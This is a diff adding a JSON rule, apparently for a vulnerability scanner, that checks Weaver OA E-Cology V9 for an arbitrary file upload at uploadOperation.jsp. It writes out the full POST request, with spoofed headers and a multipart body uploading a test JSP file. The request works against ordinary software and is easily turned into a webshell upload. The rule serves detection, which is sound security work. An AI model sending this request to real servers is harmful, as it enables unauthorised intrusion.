@@ -1,0 +1,24 @@
+{
+    "vul_name": "泛微OA E-Cology uploadOperation.jsp 任意文件上传",
+    "level": "高危",
+    "description": "泛微OA E-Cology uploadOperation.jsp 任意文件上传",
+    "product": "泛微OA E-Cology",
+    "version": "泛微OA V9",
+    "cve": "未知",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20uploadOperation.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0.html",
+    "fixing": "升级打补丁",
+    "rule": {
+        "path": "/page/exportImport/uploadOperation.jsp",
+        "method": "POST",
+        "headers": "Content-Length: 397\r\nPragma: no-cache\r\nCache-Control: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68\r\nOrigin: null\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\r\ndnt: 1\r\nx-forwarded-for: 127.0.0.1\r\nConnection: close",
+        "body": "------WebKitFormBoundary6XgyjB6SeCArD3Hc\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\ntest123\r\n------WebKitFormBoundary6XgyjB6SeCArD3Hc--",
+        "status_code": "200",
+        "keywords": "close",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
